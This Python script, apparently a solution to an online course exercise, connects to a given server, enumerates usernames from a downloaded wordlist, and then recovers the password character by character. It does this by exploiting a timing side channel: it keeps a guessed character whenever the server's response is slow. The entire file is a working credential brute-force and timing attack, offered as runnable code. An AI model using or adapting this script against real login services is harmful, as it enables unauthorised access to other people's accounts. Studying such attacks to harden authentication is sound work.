from datetime import datetime
from string import ascii_letters, digits
from urllib import request
import argparse
import json
import socket


def main():
    parser = argparse.ArgumentParser(usage="This program connects to a server.")
    parser.add_argument("ip", type=str, help="Remote IP address")
    parser.add_argument("port", type=int, help="Remote port")
    args = parser.parse_args()

    with socket.socket() as client:
        client.connect((args.ip, args.port))
        get_logins()
        for login in logins_db():
            json_data = gen_json_login(login, ' ')
            client.send(json_data.encode())
            if client.recv(1024).decode() == '{"result": "Wrong password!"}':
                break
        password_accepted = None
        password = ''
        while not password_accepted:
            for char in ascii_letters + digits:
                iter_pw = password + char
                json_data = gen_json_login(login, iter_pw)

                client.send(json_data.encode())
                request_time = datetime.now()
                json_response = client.recv(1024).decode()
                response_time = datetime.now()
                time_difference = response_time - request_time

                response = json.loads(json_response)
                result = response["result"]
                if result == 'Connection success!':
                    password_accepted = iter_pw
                    print(json_data)
                    break
                elif time_difference.microseconds >= 10000:
                    password = iter_pw


def get_logins():
    url = 'https://stepik.org/media/attachments/lesson/255258/logins.txt'
    content = request.urlopen(url)
    with open('logins.txt', 'wb') as f:
        f.writelines(content)


def logins_db():
    with open('logins.txt') as f:
        return f.read().splitlines()


def gen_json_login(username, password):
    login = {'login': username, 'password': password}
    return json.dumps(login)


if __name__ == "__main__":
    main()

